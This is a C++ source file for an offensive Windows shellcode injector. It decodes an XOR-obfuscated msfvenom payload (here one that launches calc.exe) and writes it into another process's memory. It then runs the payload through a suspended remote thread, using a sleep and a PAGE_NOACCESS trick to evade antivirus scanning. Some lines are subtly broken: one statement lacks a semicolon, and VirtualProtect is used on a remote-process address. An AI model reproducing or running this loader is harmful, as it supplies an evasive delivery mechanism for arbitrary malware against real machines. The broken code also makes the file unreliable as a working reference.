/*
	Author: @m8r0wn

	Injects shellcode into a remote process using VirtualAllocEx() / CreateRemoteThread() in a suspended state with protection
	PAGE_NOACCESS. Sleeps to avoid AV before modifying protections and calling ResumeThread
	
	References:
		https://github.com/Arno0x/ShellcodeWrapper
		https://github.com/plackyhacker/SuspendedThreadInjection
		https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/
*/

#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <Windows.h>
#include "PidAutoSelect.h"

int main(int argc, char* argv[]) {
	
	// msfvenom -p /windows/x64/exec CMD="calc.exe" -f raw -o clac.bin
	// python3 shellcodeEncoder.py calc.bin -e xor -f cpp
	char buf[] = "\xaf\x2d\xe0\x96\x95\x9c\x93\x68\x65\x6c\x2d\x32\x2e\x34\x37"
	"\x02\x33\x2b\x43\xb7\x11\x1b\xe3\x37\x0c\x24\xe8\x3d\x7c\x2d"
	"\xd8\x37\x43\x3a\xee\x06\x03\x20\x6a\xdb\x26\x29\x22\x55\xac"
	"\x1b\x54\xa3\xde\x59\x15\x2f\x6a\x49\x4c\x2d\xa2\xa6\x69\x24"
	"\x52\xa4\x81\x9f\x37\x35\x02\x20\xee\x3e\x4c\xe8\x2d\x58\x2d"
	"\x52\xb5\xe8\xf2\xed\x74\x53\x68\x2d\xe9\xac\x17\x08\x2c\x64"
	"\x83\x35\xe8\x3a\x7d\x30\xd8\x28\x45\x25\x6d\xb3\x8c\x32\x2d"
	"\xac\xac\x22\xf9\x51\xfc\x1b\x69\xb3\x21\x5d\xaa\x27\x55\xa5"
	"\xff\x24\xa2\xbb\x68\x35\x52\xa9\x5d\x8c\x19\x92\x23\x67\x29"
	"\x77\x6d\x26\x4b\xb4\x01\x8b\x30\x21\xe7\x2c\x47\x26\x65\xb5"
	"\x35\x24\xe8\x7e\x2d\x30\xd8\x28\x79\x25\x6d\xb3\x2e\xef\x61"
	"\xdb\x2d\x62\xa2\x24\x2c\x12\x30\x3b\x35\x36\x22\x37\x25\x3c"
	"\x12\x3f\x2b\xf1\x89\x54\x12\x3a\x9a\x8c\x34\x22\x36\x3e\x2d"
	"\xd8\x77\x8a\x25\x9a\x8b\xac\x35\x2d\xd6\x6d\x63\x6f\x64\x65"
	"\x53\x65\x63\x3a\xe8\xf9\x52\x69\x65\x6c\x2d\xd9\x5e\xef\x0a"
	"\xd4\x9a\xb6\xc9\x95\xc1\xf1\x3e\x24\xd6\xca\xf6\xd2\xf9\x9a"
	"\x86\x2d\xe0\xb6\x4d\x48\x55\x14\x6f\xec\x97\x83\x1a\x61\xde"
	"\x14\x76\x11\x1d\x0f\x74\x0a\x29\xec\xb6\x93\xb6\x0c\x05\x09"
	"\x30\x4b\x06\x0a\x00\x74";

	// Get PID from CMD args OR PidAutoSelect()
	DWORD pid;
	if (argc > 1) {
		pid = atoi(argv[1]);
	} else {
		PidAutoSelect p;
		pid = p.GetPid();
	}

	// Decrypt shellcode based on static key
	char key[] = "SecretShellcode";
	int i = 0;
	unsigned char shellcode[sizeof(buf)];
	for (int x=0; x < sizeof(buf); x++) {
		if (i == sizeof(key)-1) i = 0;
		shellcode[x] = buf[x] ^ key[i];
		i++;
	}
	printf("[*] Shellcode Decrypted using stored key.\n")
	
	// Execute shellcode
	PVOID procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[*] Opening process handle (PID: %d).\n", pid);

	PVOID memAddr = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("[*] Allocated Memory at 0x%p.\n", memAddr);

	WriteProcessMemory(procHandle, memAddr, shellcode, sizeof(shellcode), NULL);
	printf("[*] ShellCode copied into memory.\n");

	DWORD oldProtect;
	VirtualProtect(memAddr, sizeof(shellcode), PAGE_NOACCESS, &oldProtect);
	printf("[*] Modified memory protection to: PAGE_NOACCESS.\n");

	DWORD threadID;
	HANDLE sThread = CreateRemoteThreadEx(procHandle, NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0x00000004, NULL, &threadID);
	printf("[*] Created supsended thread in remote process.\n");

	int stime = 10;
	printf("[*] Sleeping for: %d seconds...\n", stime);
	sleep(stime);

	VirtualProtect(memAddr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
	printf("[*] Modified memory protection to: PAGE_EXECUTE_READ.\n");

	ResumeThread(sThread);
	printf("[*] Resume thread execution.\n");
	
	CloseHandle(procHandle);
	return 0;
}
